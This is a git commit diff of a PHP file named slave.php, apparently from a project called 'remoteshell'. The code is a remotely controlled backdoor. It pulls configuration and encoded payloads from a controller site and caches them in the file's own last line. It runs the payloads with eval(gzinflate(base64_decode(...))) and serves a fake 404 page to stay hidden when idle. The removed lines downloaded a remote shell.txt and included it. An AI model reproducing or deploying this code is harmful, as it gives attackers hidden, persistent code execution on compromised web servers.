d814666c7e04752313d9aae057332f9b5ff89695
mahdyfo <mahdyfof@gmail.com>
2016-10-21 12:24:42 +0330

    config-contents-cache-404 add config and contents get and set methods add 404 page add code compression/encode/run add cache system

--- slave.php
+++ slave.php
@@ -1,43 +1,21 @@
 <?php
-define( 'SITE', 'http://se.xzn.ir');
-error_reporting(0);
+define('SITE', 'http://localhost/remoteshell');
 
-$slave = new Slave;
-var_dump($slave->isOn());
+define('RES_DIR', 'res/');
+define('CONFIGS_DIR', 'configs/');
+define('CONTENTS_DIR', 'contents/');
 
-/*
-if($result == "1") {
-    curl_setopt($fp, CURLOPT_URL, $site.'/shell.txt');
-    curl_setopt($fp, CURLOPT_RETURNTRANSFER, 1);
-    $shell=curl_exec($fp);
-    $file=fopen('temp.php', 'w');
-    fwrite($file, $shell);
-    fclose($file);
-    include("temp.php");
-} else {
-    echo '<html>
-<head><title>404 Not Found</title></head>
-<body bgcolor="white">
-<center><h1>404 Not Found</h1></center>
-<hr><center>nginx</center>
-</body>
-</html>';
-}
-*/
+//error_reporting(0);
+
 class Slave {
-    private $config, $item_hash;
+    private $global_config, $item_config, $item_hash;
+    public $contents;
     
     public function __construct(){
-        //$this->item_hash = md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
-        $this->item_hash = 'abc';
-        $this->config = json_decode(json_encode([
-            'global' => ['isOn' => true,],
-            'sites'=> [
-                'abc' => ['isOn' => true]
-            ]
-        ]));
+        $this->item_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
         
-        $this->config = $this->getConfig();
+        $this->global_config = $this->getGlobalConfig();
+        $this->item_config = $this->getItemConfig();
     }
     
     //requests
@@ -50,25 +28,132 @@ class Slave {
         curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
 
         $result = curl_exec($c);
+        
+        if($result && curl_getinfo($c, CURLINFO_HTTP_CODE) === 200){
+            curl_close($c);
+            return $result;
+        }
         curl_close($c);
-
-        return $result;
+        return false;
     }
     
     //filegets
-    private function getConfig(){
-        return json_decode($this->getUrl('config'));
+        //config
+    private function getGlobalConfig(){
+        return json_decode($this->getUrl(RES_DIR . CONFIGS_DIR . 'global'));
+    }
+    private function getItemConfig(){
+        return json_decode($this->getUrl(RES_DIR . CONFIGS_DIR . $this->item_hash));
     }
     
+        //contents
+    /*
+     * Gets the last line from this file
+     * 
+     * Return json_decoded Obj
+     */
+    private function getLocalContents(){
+        $f = fopen(basename(__FILE__), 'r');
+        $cursor = -1;
+        $char = $line = "";
+
+        while ($char !== false && $char !== "\n" && $char !== "\r") {
+            $line = $char.$line;
+            fseek($f, $cursor--, SEEK_END);
+            $char = fgetc($f);
+        }
+        //$this->contents = substr($line, 2); //strip comment marks (//)
+        return substr($line, 2); //strip comment marks (//)
+    }
+    /*
+     * string $config: base64_encoded
+     * 
+     * Overwrites given config on the last line
+     */
+    private function setLocalContents($contents){
+        $f = fopen(basename(__FILE__), 'r+');
+        $cursor = -1;
+        $char = $line = "";
+
+        while ($char !== false && $char !== "\n" && $char !== "\r") {
+            $line = $char.$line;
+            fseek($f, $cursor--, SEEK_END);
+            $char = fgetc($f);
+        }
+        
+        fputs($f, '//' . $contents);
+    }
+    private function getRemoteContents(){
+        $item_contents = $this->getUrl(RES_DIR . CONTENTS_DIR . $this->item_hash);
+        if($item_contents){
+            return $item_contents;
+        }else{
+            return $this->getUrl(RES_DIR . CONTENTS_DIR .'global');
+        }
+    }
+    private function getContents(){
+        if (!$this->contents) {
+            if($this->useCached()){
+                $this->contents = $this->getLocalContents();
+            }else{
+                if($remote = $this->getRemoteContents()){
+                    $this->contents = $remote;
+                    $this->setLocalContents($this->contents);
+                }else{ // if can't get from remote site
+                    $this->contents = $this->getLocalContents();
+                }
+            }
+        }
+        return $this->contents;
+    }
+
     //config checks
     public function isOn(){
-        if($this->config->global->isOn){
-            if($this->config->sites->{$this->item_hash}->isOn){
+        if($this->global_config->isOn){
+            if($this->item_config->isOn){
                 return true;
             }
         }
         
         return false;
     }
+    private function useCached(){
+        if($this->global_config->cache){
+            if($this->item_config->cache){
+                if($this->item_config->cache_exptime > time()){
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+    
+    public function runCode(){
+        eval(gzinflate(base64_decode($this->getContents())));
+    }
+    
+    public function show404() {
+        header("HTTP/1.0 404 Not Found");
+        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+        <html><head>
+        <title>404 Not Found</title>
+        </head><body>
+        <h1>Not Found</h1>
+        <p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>
+        <hr>
+        <address>PHP/' . phpversion() . ' Server at ' . $_SERVER['SERVER_NAME'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address>
+        </body></html>';
+        
+
+        exit;
+    }
 }
 
+$slave = new Slave;
+if($slave->isOn()){
+    $slave->runCode();
+}else{
+    $slave->show404();
+}
+
+//S03OyFcwsgYA
